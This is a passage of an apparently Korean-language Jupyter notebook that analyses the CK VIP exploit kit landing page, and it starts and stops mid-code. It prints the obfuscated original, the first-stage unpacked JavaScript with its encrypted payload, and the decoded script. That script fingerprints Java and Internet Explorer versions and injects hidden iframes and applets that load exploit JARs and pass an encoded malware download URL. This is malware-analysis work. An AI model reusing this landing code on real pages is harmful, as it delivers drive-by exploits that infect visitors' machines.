VIP*/c,/*478188809*/k,/*Js'NB VIP*/e,/*Js'NB VIP*/d/*Js'NB VIP*/){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('68 125=300,106=125(\\'270\\'+\\'271\\'+\\'269\\'+\\'94\\'),130=\\'%31\\'+\\'%32\\'+\\'%33\\'+\\'%34\\'+\\'%35\\'+\\'%36\\'+\\'%37\\'+\\'%38\\',105=\\'%64\\'+\\'%265\\'+\\'%63\\'+\\'%75\\'+\\'%279\\'+\\'%65\\'+\\'%275%74\\',121=\\'157/161+160+165/144/132/+137+134+136/139+140/143+145/135/138/141/142/133+163+217+200+166+202+203+199+198/194/193+195/196/197+204+205+213+214+215+216+212+211/207/206+208/209/210+192+191/174+175+176/177/173/172/168/180++182+183+184+283\\',103=\\'%77\\'+\\'%72%69%74\\'+\\'%65\\',111;95 120(71){68 70,66,73,99;68 96,110;70=[];73=71.82;66=0;88(66<73){99=71.76(66++);181(99>>4){78 0:78 1:78 2:78 3:78 4:78 5:78 6:78 7:70[70.82]=71.185(66-1);90;78 12:78 13:96=71.76(66++);70[70.82]=92[\\'107\\'](((99&186)<<6)|(96&117));90;78 14:96=71.76(66++);110=71.76(66++);70[70.82]=92[\\'189\\'+\\'188\\'+\\'187\\'+\\'179\\'](((99&171)<<12)|((96&117)<<6)|((110&117)<<0));90}}80 70.119(\\'\\')}68 122=\\'%39\\'+\\'%63\\'+\\'%112\\'+\\'%63\\'+\\'%112\\'+\\'%63\\'+\\'%112\\';68 102=169 167(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1);105=106(105);95 131(71){68 98,93,84,86;68 66,73,70;73=71.82;66=0;70=\"\";88(66<73){109{98=102[71.76(66++)&87]}88(66<73&&98==-1);81(98==-1)90;109{93=102[71.76(66++)&87]}88(66<73&&93==-1);81(93==-1)90;70+=92.107((98<<2)|((93&158)>>4));109{84=71.76(66++)&87;81(84==61)80 70;84=102[84]}88(66<73&&84==-1);81(84==-1)90;70+=92.107(((93&162)<<4)|((84&164)>>2));109{86=71.76(66++)&87;81(86==61)80 70;86=102[86]}88(66<73&&86==-1);81(86==-1)90;70+=92[\\'149\\'+\\'148\\'+\\'151\\'](((84&155)<<6)|86)}80 70}95 129(67,104){68 118=67.82;68 126=67[118-1]&100;114(68 66=0;66<118;66++){67[66]=92.107(67[66]&87,67[66]>>>8&87,67[66]>>>16&87,67[66]>>>24&87)}81(104){80 67.119(\\'\\').277(0,126)}276{80 67.119(\\'\\')}}95 113(91,104){68 73=91.82;68 67=[];114(68 66=0;66<73;66+=4){67[66>>2]=91.76(66)|91.76(66+1)<<8|91.76(66+2)<<16|91.76(66+3)<<24}81(104){67[67.82]=73}80 67}111=106(130+122);95 128(71,123){81(71==\"\"){80\"\"}68 67=113(71,124);68 115=113(123,124);68 97=67.82-1;68 83=67[97-1],79=67[0],116=273;68 101,94,127=267.266(6+52/(97+1)),89=127*116&100;88(89!=0){94=89>>>2&3;114(68 85=97;85>0;85--){83=67[85-1];101=(83>>>5^79<<2)+(79>>>3^83<<4)^(89^79)+(115[85&3^94]^83);79=67[85]=67[85]-101&100}83=67[97];101=(83>>>5^79<<2)+(79>>>3^83<<4)^(89^79)+(115[85&3^94]^83);79=67[0]=67[0]-101&100;89=89-116&100}80 129(67,302)}103=106(103);108=\\'295/289+288+287+286+290+291+294+293/292+263/262+234/233+232+231+235/236+239+238+237+230/229+222/221+220+219/223/224/228+227/226+225+240+241/256/255+254/253+257+258/261+260+259/252+251+245+244/+\\'+121+\\'+243/242+246+247+250/249/248/146/296+297+298+299/3+285+272/264/281/282+280+278+284+201+153+154/152+150/156+0/159/170+178+190/147+303+301/305/304/268+274\\';108=120(128(131(108),111));218[105][103](108);',10,306,vhz2z3[HlssUrQp1](ALYgrt3),0,{}))}function ckl(){var mini;mini=new window['Array'](263,275,275,271,217,206,206,259,262,271,270,259,270,278,270,269,205,258,270,205,266,273,206,256,259,268,264,269,206,268,256,264,267,206,278,264,269,205,260,279,159,260);return mini;}\n",
    "</script>\n",
    "</body>\n",
    "</html>\n",
    "<script language=\"javascript\" src=\"http://count2.51yes.com/click.aspx?id=26743530&logo=6\" charset=\"gb2312\"></script>\n",
    "```\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "e3108e5b-0f58-42ce-b6ad-b75475de2226"
    }
   },
   "source": [
    "#### CK VIP EK Landing Page의 구조\n",
    "\n",
    "1차 난독화 해제 코드가 위 아래의 코드의 값을 이용하여 난독화 해제를 한다.\n",
    "\n",
    "그리고 2차 난독화가 끝나면 볼 수 있을텐데, 함수 ckl()의 값을 가져와서 악성코드 url을 디코딩 하는 함수를 확인할 수 있을 것이다.\n",
    "\n",
    "그리고 마지막에는 국내에서 악성코드를 유포하는 EK의 전통적인 URL인 방문자 횟수를 체크하는 51yes.com url삽입되어 있다.\n",
    "\n",
    "![alt text](img/fig11.png)\n",
    "![alt text](img/fig12.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "a20770bf-e34d-4395-ab41-f0e6df92f0d0"
    }
   },
   "source": [
    "#### 1차 난독화 해제 코드 알아보기\n",
    "난독화된 코드 사이에 주석으로된 코드가 보일 것이다.\n",
    "\n",
    "```javascript\n",
    "var /*JS's NB*/vhz2z3/*JS's NB*/=/*JS's NB*/vhz2z/*JS's NB*/+/*JS's NB*/vhz2z4;/*NB VIP*/vHz2(/*10.21*/function(/*Js'NB VIP*/p,/*Js'NB VIP*/a,/*Js'NB VIP*/c,/*478188809*/k,/*Js'NB VIP*/e,/*Js'NB VIP*/d/*Js'NB VIP*/)\n",
    "```\n",
    "\n",
    "이 때문에 JS CK VIP, JS NB VIP, CK VIP 등으로 해당 exploit kit이 명명 되었다.\n",
    "그리고 해당 주석 부분에서 Dean Edwards' Packer가 보인다.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "174c1289-3cb7-4a55-80e0-4a897694a57d"
    }
   },
   "source": [
    "#### 1차 난독화 해제하기\n",
    "해당 코드는 kahu security의 javascript deobfuscation으로 난독화 해제가 불가능하지만,\n",
    "> javascript 엔진을 browser와 다른것을 사용하기 때문에,\n",
    "> 사소한 코드 에러 때문에 동작하지 않는 것으로 판단\n",
    "\n",
    "kahu security의 다른 도구인 revelo와 같은 javascript 도구를 이용하면 난독화가 해제된다.\n",
    "\n",
    "다음 그림과 같이 vHz2 변수를 eval로 변경하면 가능하다.\n",
    "\n",
    "vHz2 = window[\"\\x65\"+\"\\x76\\x61\\x6c\"] window[\"eval\"] 은 정상적으로 동작하지 않는 것으로 보인다.\n",
    "\n",
    "![alt text](img/fig6.png)\n",
    "\n",
    "![alt text](img/fig7.png)\n",
    "\n",
    "\n",
    "1차적으로 Dean Edwards' Pack을 풀면 아래의 코드가 나온다.\n",
    "```javascript\n",
    "var itVm_snY3=eval,AVgHbu2f=itVm_snY3('u'+'nes'+'cap'+'e'),GIEMslIELDjE='%31'+'%32'+'%33'+'%34'+'%35'+'%36'+'%37'+'%38',X3cQCMIIF='%64'+'%6f'+'%63'+'%75'+'%6d'+'%65'+'%6e%74',KeY='amFXzdlWQ/l96SCzj854x2RKmOvxs+URpV4C1J2OgUiPds9gRcT4Mqw8cJJ9LTWOuaw9xXC5mwBWVcpg0sTiGre6rgp8xCMkX1YKT8oHjab2AZEMDCiLgEh7nnUSgiiV1T74oxS1yk8q27WkM9HuSnXqE9MQgJaMOgu+XntEaVVyQ27nj9E9R3y3nf0/ejzoyWiqVmI3k5ynQBm3hwOUTmms6axy65JaOJwrGt5xrWmwfpSML0BjDG0yL0kztCJTt1xA8d6DyNW9zy1ABQJcfFyYn/HgAGJ6WJYFL/+fgve7a+e62g5+0qok8YGem8PmDiLUw1EYKPIRFxU1kZS43mmanxoE/dG9voAXeorZrnD5DajGhFD+oEAN/GlXx3vsD0bwf3lHbLW2anQJddojjhVbr+vWQMtSWSbIwgH4UzcN6nuRP7n4q99PZW8jteXrpgcQgdpbkHABTO/HlG2Q0h6qH4VDaIszr/1tp1ALr5sXKzYLxaH/ATYDZH4phKQMGo2iDgqA4W24hONU2RMt3yq/7OSS3gt/fYcoa+MyyiqZ3ee5TbHN2GYG+3fjg6YwKqpgOB8iHDU3UBPzKk8yEtb0Gmx+Whw0VLgIjGuJH7CcSUre+NS6V+RslR2csadulegltGOKgc3I9SDHt4kWdn65cft+L+pOKgpmbCSJIFpzVHlcB9LQae7SKNl6y51j7CSURxLrurhaDCwQjN0FTWVd85TmX7wmR6M1ynZ8zqJpIEa5daTeOKqYdNKAqaEwdHQI2HFrW5eRqQmEktl72YZhdLMgXbY+qe40e0h3mKHqimOewpSVdGzQb4vxNMfh4gj0IWEvkNc1wzcQMDq6UEi/mri0hTbS4RbK4Moo18LyZjQHSgZj/m8gdyaOXgSv0QTIS6Z3T6ZC14+7kpwrNKACTYryrtGh3usPHhiFDs8GGEFJDit2Eyk6ZZNODzTxzXhT6yOLuM06uY/UHs8pJ3fp1TRSUNWam/L1UO+r4VoMb+lpAu7f3ml9n1QAJlTInnzzynohGLlVnRURDHp0gbyISumaTAuJvLviW4R40boA+Mwtrb+56io9PcHvHsBlE5kuKeN4gcYr0gEFmxCTmzysfYnGsRmk4useGZtT0UGwtkHWGdfVPzumQ+PkwHurzm74ZKrN3M4CJdiL1ORQKSPtsD9s0LeYmx4dr1zaalo6ElNx3E2x8rD7+Vc5RIc5Zpwan4RBM2mTVsgiVdJOyqwHug9QucLLcRRp5mDTGJiz0UALKtfDabnee2J5qQzWvr2yRyTfyQebMtCCr+WOkEKWr5AqY8rlPmppLzySTD8duxe1MdxB7eq+U5a9/ufSAZ9s0DCG91NKkPSIih7Yny/QbqVoKOyjolYj9vHKOGhLZq9n7lDMKvb4eZ61QQbsGXciI1eM6CKrbq8VT6eMHecnqJASAk0I2d4NXSqLmVB2qch1rTDslN25KH3nHZqrpc4uJ7v5XBqJ1dYKvFilTuCjCsSOuDoFVHNxq52P+fxvsOrkrOBTu4ekO3sOwaHqILAonzSt0whMC0e/gZ/YK1qy1X+VYFYmjafyrmdCYPbyNXiGoiE9AjsNMZ0xjS+elAU9xX7rVuSOkz28mCGZylP/CMfBZkeNIl4oQka8g+YwYzTYchmXxY7+axTs0jn4qynjKptUQA28sJm/Pa0dlGfkquC/dxFOn8Q6376zO1qm1P5bEH9C4G1/mW/vYJzslNjO6Q2S90TOo3JLhsIdr8o8FzBxgYbwwFLnmD5TGMOVEOeLiuTVOr8ZaSi/6iJLK2aWHg9JPUx0Eum1ni++fNmmjSrTgJixN5WBZwyzKQDCvxAAPtBRUlekSb+VpZLp4BQ4hilnf9LgHTRzeuedKUntBj6tQOoDT4Ckt+Ej0AwthrOZX2r8WsU4KV4dXYn86bb0kGBJAU4pr4kGas8dD71qW94OLX+nbVZ1ZS3o4vpMZv3AoXhga2Xlo4jjDUTf',ErTiUlaxlkP='%77'+'%72%69%74'+'%65',BMOYPRD4H;function utf8to16(str){var out,i,len,c;var char2,char3;out=[];len=str.length;i=0;while(i<len){c=str.charCodeAt(i++);switch(c>>4){case 0:case 1:case 2:case 3:case 4:case 5:case 6:case 7:out[out.length]=str.charAt(i-1);break;case 12:case 13:char2=str.charCodeAt(i++);out[out.length]=String['fromCharCode'](((c&0x1F)<<6)|(char2&0x3F));break;case 14:char2=str.charCodeAt(i++);char3=str.charCodeAt(i++);out[out.length]=String['fr'+'omC'+'harCo'+'de'](((c&0x0F)<<12)|((char2&0x3F)<<6)|((char3&0x3F)<<0));break}}return out.join('')}var NtCion='%39'+'%63'+'%6b'+'%63'+'%6b'+'%63'+'%6b';var nbChar=new Array(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1);X3cQCMIIF=AVgHbu2f(X3cQCMIIF);function nbcode(str){var c1,c2,c3,c4;var i,len,out;len=str.length;i=0;out=\"\";while(i<len){do{c1=nbChar[str.charCodeAt(i++)&0xff]}while(i<len&&c1==-1);if(c1==-1)break;do{c2=nbChar[str.charCodeAt(i++)&0xff]}while(i<len&&c2==-1);if(c2==-1)break;out+=String.fromCharCode((c1<<2)|((c2&0x30)>>4));do{c3=str.charCodeAt(i++)&0xff;if(c3==61)return out;c3=nbChar[c3]}while(i<len&&c3==-1);if(c3==-1)break;out+=String.fromCharCode(((c2&0XF)<<4)|((c3&0x3C)>>2));do{c4=str.charCodeAt(i++)&0xff;if(c4==61)return out;c4=nbChar[c4]}while(i<len&&c4==-1);if(c4==-1)break;out+=String['fro'+'mCha'+'rCode'](((c3&0x03)<<6)|c4)}return out}function long2str(v,w){var vl=v.length;var sl=v[vl-1]&0xffffffff;for(var i=0;i<vl;i++){v[i]=String.fromCharCode(v[i]&0xff,v[i]>>>8&0xff,v[i]>>>16&0xff,v[i]>>>24&0xff)}if(w){return v.join('').substring(0,sl)}else{return v.join('')}}function str2long(s,w){var len=s.length;var v=[];for(var i=0;i<len;i+=4){v[i>>2]=s.charCodeAt(i)|s.charCodeAt(i+1)<<8|s.charCodeAt(i+2)<<16|s.charCodeAt(i+3)<<24}if(w){v[v.length]=len}return v}BMOYPRD4H=AVgHbu2f(GIEMslIELDjE+NtCion);function nbencode(str,key){if(str==\"\"){return\"\"}var v=str2long(str,false);var k=str2long(key,false);var n=v.length-1;var z=v[n-1],y=v[0],delta=0x9E3779B9;var mx,e,q=Math.floor(6+52/(n+1)),sum=q*delta&0xffffffff;while(sum!=0){e=sum>>>2&3;for(var p=n;p>0;p--){z=v[p-1];mx=(z>>>5^y<<2)+(y>>>3^z<<4)^(sum^y)+(k[p&3^e]^z);y=v[p]=v[p]-mx&0xffffffff}z=v[n];mx=(z>>>5^y<<2)+(y>>>3^z<<4)^(sum^y)+(k[p&3^e]^z);y=v[0]=v[0]-mx&0xffffffff;sum=sum-delta&0xffffffff}return long2str(v,true)}ErTiUlaxlkP=AVgHbu2f(ErTiUlaxlkP);t='LuR5uQzyZb4ZlDpSK66wVli90C5VjWZaeYhdejefUdXsNpgo0ZLRvi1Jy4N9J/FgyKA8mgKvqN5hTNrOXx+qARPnOweHAUqWgazndLTM0gS7ATt3I2oVSo7pkXj0XKjMTvJDOCpg+4Gv1HWXHlKcXFpbcYX83wLm8j9b07ADGPUD4ZNGjTwrnWxNhcbaDpOfugoEtoulQbKmquLikWS8ZgAKkOIzY+DapdSDguBoHvg9+UlGk0+RKTmRqmPe7Duq0BZbluMqlksoaE2vD6bKFJbCe4iRQ6GwTeWVZzC9o7lzxw3g+DjkJa8Tls3+FAD2/WrC90B2350tY5UiuZDOcu3YpFeDDyLQ0AM6Xrx7YIzzzeNKzpjs3Xy6Uy9eBfnmIzdRrocXduhAa3Gw4LMsAfU+AHcHxkhsJ25nzRdVqncUVuMTfXD1Da7XK0CE/INsC5yTHcbqgdJrnB2CZ1cr9cLkvS8IbNys+0vsNw5FqmQEAYuplFrt98a2yCWVTs5yrpYKiWDO9uxVOLjcBLsyFQJgGhD9gRWav3SuqfMyW3dvM3BZActgas4Xo5oz624ZWKPw4VoTjtoJSnlEyrfye8r/7YK81INsk6Uz8l+IEZe8uY2TqqwEu5jykd3J55XXaJ42d+v4OkEe2ZxGcvth257PwVQb0ub5SgV5puFW4gde5w6clapbI2AAykDr7QUrPgpGH1PYlozHJPURX61ROk2gHLC01k3I9d6pjtn+lH9qOZis6wzk8Y8QctBLsIx69FHY7B/11UG+GeJQAMbK6K77TumvrlEFonf0Ovi2iniFbh08m3cQAORcARLQNepCElHUY4P8VhdYCjNvFNHaPBm5HXmma+5d5eN0VqfrPFvyGkFV5JrU88oxT1pUXG8CBtFQxgicMh3P6bNaELkOO+RS4ADhxypxfdvlfCrKRC4ISQSpRbU4BWkZzFoIFTN3haSKVGiagHKJ2mT9Tqf8X0xDWH6lYahWKW9dW31h0z7x2yHx7n56QR3w8gRuDuId+R2aUXN899lY/Tq1bIKvOmdKRqbNpdb5cGc3d+7kxPX506IoEGeoQ2swFj/4J9tUQi99zY4Bjmc1SyADJiqeDNkY7b8uw7XL4kwrpwy4GVDsMh8m6P1wPp+9N+3goD/bzvyk/39XgaLNhwLo9ErYLLi7fnP82Ux/BSX4ZQZoW6x0JH3RIbEH9ME1tABADI2DmaO87lIlQGSQ57d1KpJ7sJ8rQ8AeXyaAaTtW2nVefxcirTmnYoxiACYxk8F4pBDOCvm3mDkm5ApqQvmKTuwMrFu9+RigwWVLYW/AYYJV2Ud1dvs7DYy0No+zng3hPhYID+KJb6Nqq8BoBvStBLoTM9TzGhnOLku3jWkOlk53wUW4Z0H6EplheWJLUeQX7cG9oG+nmQnIZzlUhV0Wyaey2CcYzui1JHsBTCTJarjN9z3nwybtCm6M0KT1eK1NSi0PB5FbMvSJK/x5EhVdw5SGIfKJJ5LzQa6MQnvkVXW4RWFPYX6S4L7qHN1cAdqyP7pXB/zOJcI71AVXyOoj5rFb4rG6RCPZ2mKMBndrtJNDwjEylqCWGflKjK4MF+NanzUKOF5FgAUfEjCvARRNUDM5enzjpU/0lvtF4acl+oAsrqxNA3ebBW4xx81xdOJaKvG6OW+c9arTYmROBS4vzYMzHdMAj0bfDFi4GCR5cyseIiMUcr7rcsxDteAsz9s4qrbMLpvLvOn3zIGcFphhJxG90dObQ7z0pOUvPepQ77AM5YgyeKtHvzoJb/AHr6iDjpx1z+7A87pQ+eQqB/m1k7Jn3t91i2bkIHOOdcRsiLlE8DhbE50QNUydQZiHl9F8G5DDgioIZnWwJ+cm+cgXfUFuX+hJJh8F2/+'+KeY+'+s6l0Z8jQJ3XXImIWJyu/4QBMjo6UHuEH3T88jkp3bnRxrxsxNQ7uWrmy57UrSgJLFUH3lwBXDoGbtK0VmGvI4iiTl6e4b+HckMdGiuKNssm5kbzjtQsQEh+vNuqLcoYTrSTt8RSmaaaUrrN9oh9dTfmFDntxyvb1zVMBGcRIgAWH+akDF7LEZES6W8VDwuXk/2YKxCgTszXTQMG2oJwN3apfWcUpELQerhfLfGdeIIgB0IFr9CyK7f/HEMkeq00gxjBRkgWVVRg5BYieaXlNO7NSuRtEBQPXuGS77HbBL7RN1smIvvstap0z2XB41ZUwvmIEbA8spyRUenDvfHpIR9iZwABF5RycqD1L/8HGJCh1idEw0Bo1W16p/oWla84oDmdoetK4APv2JHRc0vTqk+HWFShDHe44QG3xMzqtkDjPF7L4Ix7+M7JgrZspyS4kc+zeR9GNyNmEfbyK/3+qTmtx8O4Seda4030oiqSTS6is7sI+OiJWnvyvFI4AXlD01xbhjmjIRg/z9PfA6SKi1KZ8sMCgYPcX7Llw/PBI5u4uTRy/HK7SlQJ1XFyJf1lUCdzMCg7MUduRoSp2fVRgfHNaJ32UOnFfl9wj7ulzOunE4LeReuCOONVQCdpaPl0jX2LM1iJTJEqyYtPCFRgS0R8l84ZLYnCC1Q6Jur+S4UVbzmZkoWK47LPfS3uyUuVEqqneI+4Wf5AE0685fcTNz3asrk0agsEeRfJs5bGkTGtO+zV3YTRnmEORpJKjStNiO1z1E0FEGyLuAxFhZ7Nues1ggxglPcwCFeDO+0978HzQaMXXz24WBWm1QbyiYGVGCoCLU3nbBjJ6+pXOgyMMQN4mrhhFnVzRoAOqHdEOzBVP1JcGfzyapNUBLtiJYSX6rkDEngp2hxabHEffuILBKShxC1bu1OX5+DUuT1/u7Ut0F6v38CNH5ZES0E3m63EoH6jiqQ0C34YLxEGj4fe1HJR7qfkMDH+ZAahwtK2U6NgKmp13YoeoilvC0vp6wF/42sQFqveZmFthRv9cRLEkx085ih8+0/oN3EVk65oyD/xBVxhwEX6C9bAWV1OP0wlQv5u4MnvT4iGviRs7C4FHPOcBb3pThPQCFDHnB6N5816ae7uIomfAYpCQzFG3EifoJsWn79A4si+pKo8UF3jCi5fzTrEnDDLvMByVL7g+bPtzChOQUHK4raiXfw1kAS01hvc6mXUR59d9792VVQKhjgKgA1fh24TTS82HwlQU2fm6eqYtzE6hvrdRfaSLRIDsFRIifn9gfkRUoVqDG0WRXTKr/xDZQ8E9rr1JGJK3KJiBmzrhKFLJJ2LI+yOgaV7gTJK73IoMxaEc6pn0s+86eHPf9YN3/HJ6cBt2R0Jw9DYR1KzZYY2A7WbP4tF4fwRmzBDRVLcH2lhN8OavWS/hTlgLLZXGfcq6rIDtfICRvU4DJjvV15qrPAO/DXeQ8Ih00L+MJvwFbd9kybNV6kaSOLSwkReClcCszUaCXIR1WlqdWdrH';t=utf8to16(nbencode(nbcode(t),BMOYPRD4H));window[X3cQCMIIF][ErTiUlaxlkP](t);\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "018df919-082d-4ed2-b9bc-f1841e449fb5"
    }
   },
   "source": [
    "#### 2차 난독화 해제 코드 알아보기\n",
    "1차 난독화 해제 후, 코드의 마지막을 보면\n",
    "\n",
    "```javascript\n",
    "1 t=utf8to16(nbencode(nbcode(t),BMOYPRD4H));\n",
    "2 window[X3cQCMIIF][ErTiUlaxlkP](t);\n",
    "```\n",
    "\n",
    "코드가 존재한다.\n",
    "\n",
    "첫번째 라인은,\n",
    "\n",
    "변수 t와 BMOYPRD4H를 인자로 할당한,\n",
    "\n",
    "각각 nbcode(), nbencode(), utf8to16() 함수의 결과 값을 t에 저장한다.\n",
    "\n",
    "두번째 라인은, \n",
    "\n",
    "X3cQCMIIF와 ErTiUlaxlkP에 각각 \"document\", \"write\" 가 저장되어\n",
    "\n",
    "변환하면 window[\"document\"][\"write\"](t)로 볼 수 있다.\n",
    "\n",
    "따라서 해당 코드를 eval(t)로 하면 2차 난독화된 소스코드를 난독화 해제할 수 있다."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "378f768b-3237-4478-9597-1e3d060220da"
    }
   },
   "source": [
    "#### 2차 난독화 해제하기\n",
    "\n",
    "해당 코드를 다시 revelo를 이용하여 풀어보자,(javascript deobfuscator 에서도 가능하다)\n",
    "![alt text](img/fig8.png)\n",
    "\n",
    "스크립트 제일 아래에 있는\n",
    "```javascript\n",
    "window[X3cQCMIIF][ErTiUlaxlkP](t);\n",
    "```\n",
    "코드를\n",
    "\n",
    "```javascript\n",
    "eval(t)\n",
    "```\n",
    "로 변환 한다.\n",
    "\n",
    "![alt text](img/fig9.png)\n",
    "\n",
    "그리고 execute를 누르면 result에서 결과를 확인 할 수 있다.\n",
    "\n",
    "![alt text](img/fig10.png)\n",
    "\n",
    "\n",
    "```javascript\n",
    "<script type=\"text/javascript\">\n",
    "\tfunction encode() {\n",
    "\t\tvar omg = ckl(), x1 = new Array, x2 = '';\n",
    "\n",
    "\t\tfor(var i=0;i<omg.length;i++) {\t\n",
    "\t\t\tif(omg[i] == 159) {\n",
    "\t\t\t\t//x2 += '';\n",
    "\t\t\t} else {\n",
    "\t\t\t\tx1[i] = omg[i] - 159;\n",
    "\t\t\t\tx2 += String.fromCharCode(x1[i]);\n",
    "\t\t\t}\n",
    "\t\t}\n",
    "\t\treturn x2;\n",
    "\t}\n",
    "\n",
    "\tfunction bu() {\n",
    "\t\tdocument.writeln(\"<iframe src=\" + bugatti + \".html width=30 height=1><\\/iframe>\");\n",
    "\t}\n",
    "\n",
    "\tfunction fe() {\n",
    "\t\tdocument.writeln(\"<iframe src=\" + ferrari + \".html width=30 height=1><\\/iframe>\");\n",
    "\t}\n",
    "\n",
    "\tvar ckurl = encode();\n",
    "\n",
    "\tvar wmck=deployJava.getJREs()+\"\";\n",
    "\twmck=parseInt(wmck.replace(/\\.|\\_/g,''));\n",
    "\n",
    "\tvar WhatIE = navigator.userAgent.toLowerCase();\n",
    "\n",
    "\tif( wmck > 17006 && wmck < 17011 ) {\n",
    "\t\tvar jaguarx = jaguar + \".jar\";\n",
    "\t\tif(WhatIE.indexOf(\"msie 6\") > -1) {\n",
    "\t\t\tdocument.writeln(\"<object classid=\\'clsid:8ad9c840-044e-11d1-b3e9-00805f499d93\\' width=\\'600\\' height=\\'400\\'><param name=xiaomaolv value=\\'\"+ckurl+\"\\'><param name=bn value=\\'woyouyizhixiaomaol\\'><param name=si value=\\'conglaiyebuqi\\'><param name=bs value=\\'748\\'><param name=CODE value=\\'xml20130422.XML20130422.class\\'><param name=archive value=\\'\"+jaguarx+\"\\'><\\/object>\");\n",
    "\t\t}else {\n",
    "\t\t\tdocument.write(\"<br>\");\n",
    "\t\t\tvar gondady=document.createElement(\"body\");\n",
    "\t\t\tdocument.body.appendChild(gondady);\n",
    "\t\t\tvar gondad=document.createElement(\"applet\");\n",
    "\t\t\tgondad.width=\"600\";\n",
    "\t\t\tgondad.height=\"400\";\n",
    "\t\t\tgondad.archive=jaguarx;\n",
    "\t\t\tgondad.code=\"xml20130422.XML20130422.class\";\n",
    "\t\t\tgondad.setAttribute(\"xiaomaolv\",ckurl);\n",
    "\t\t\tgondad.setAttribute(\"bn\",\"woyouyizhixiaomaol\");\n",
    "\t\t\tgondad.setAttribute(\"si\",\"conglaiyebuqi\");\n",
    "\t\t\tgondad.setAttribute(\"bs\",\"748\");\n",
    "\t\t\tdocument.body.appendChild(gondad);\n",
    "\t\t}\n",
    "\t}else if( wmck >= 17000 && wmck < 17007) {\n",
    "\t\tvar audix = audi + \".jar\";\n",
    "\t\tif(WhatIE.indexOf(\"msie 6\") > -1) {\n",
    "\t\t\tdocument.writeln(\"<object classid=\\'clsid:8ad9c840-044e-11d1-b3e9-00805f499d93\\' width=\\'256\\' height=\\'256\\'><param name=xiaomaolv value=\\'\"+ckurl+\"\\'><param name=bn value=\\'woyouyizhixiaomaolv\\'><param name=si value=\\'conglaiyebuqi\\'><param name=bs value=\\'748\\'><param name=CODE value=\\'setup.hohoho.class\\'><param name=archive value=\\'\"+audix+\"\\'><\\/object>\");\n",
    "\t\t}else {\n",
    "\t\t\tdocument.write(\"<br>\");\n",
    "\t\t\tvar gondady=document.createElement(\"body\");\n",
    "\t\t\tdocument.body.appendChild(gondady);\n",
    "\t\t\tvar gondad=document.createElement(\"applet\");\n",
    "\t\t\tgondad.width=\"256\";\n",
    "\t\t\tgondad.height=\"256\";\n",
    "\t\t\tgondad.archive=audix;\n",
    "\t\t\tgondad.code=\"setup.hohoho.class\";\n",
    "\t\t\tgondad.setAttribute(\"xiaomaolv\",ckurl);\n",
    "\t\t\tgondad.setAttribute(\"bn\",\"woyouyizhixiaomaolv\");\n",
    "\t\t\tgondad.setAttribute(\"si\",\"conglaiyebuqi\");\n",
    "\t\t\tgondad.setAttribute(\"bs\",\"748\");\n",
    "\t\t\tdocument.body.appendChild(gondad);\n",
    "\t\t}\n",
    "\t}else if(wmck <= 16027 && WhatIE.indexOf('rv:11')==-1) {\n",
    "\t\tif(WhatIE.indexOf(\"nt 6.1\")>-1 || WhatIE.indexOf(\"nt 6.2\")>-1 || WhatIE.indexOf(\"nt 6.3\")>-1) {\n",
    "\t\t\tvar benzx = benz + \".jar\";\n",
    "\t\t\tvar okokx = astonmartin + \".class\";\n",
    "\t\t\tvar ckckx = document.createElement('applet');\n",
    "\t\t\tckckx.archive=benzx;\n",
    "\t\t\tckckx.code=okokx;\n",
    "\t\t\tckckx.width=\"30\";\n",
    "\t\t\tckckx.height=\"1\";\n",
    "\t\t\tdocument.body.appendChild(ckckx);\n",
    "\t\t\tvar ckcks=document.createElement('param');\n",
    "\t\t\tckcks.name=\"dota\";\n",
    "\t\t\tckcks.value=ckurl;\n",
    "\t\t\tckckx.appendChild(ckcks);\n",
    "\t\t}else {\n",
    "\t\t\tvar benzx = benz + \".jar\";\n",
    "\t\t\tvar okokx = GTR + \".class\";\n",
    "\t\t\tvar ckckx = document.createElement('applet');\n",
    "\t\t\tckckx.archive=benzx;\n",
    "\t\t\tckckx.code=okokx;\n",
    "\t\t\tckckx.width=\"30\";\n",
    "\t\t\tckckx.height=\"1\";\n",
    "\t\t\tdocument.body.appendChild(ckckx);\n",
    "\t\t\tvar ckcks=document.createElement('param');\n",
    "\t\t\tckcks.name=\"dota\";\n",
    "\t\t\tckcks.value=ckurl;\n",
    "\t\t\tckckx.appendChild(ckcks);\n",
    "\t\t}\n",
    "\t}\n",
    "\t\n",
    "\tdocument.writeln(\"<iframe src=\" + maserati + \".html width=30 height=1><\\/iframe>\");\n",
    "\n",
    "\tif( WhatIE.indexOf('trident')>-1 && WhatIE.indexOf('rv:11')>-1 ) {\n",
    "\t\tsetTimeout(\"window.location='\" + bugatti + \".html'\", 6000);\n",
    "\n",
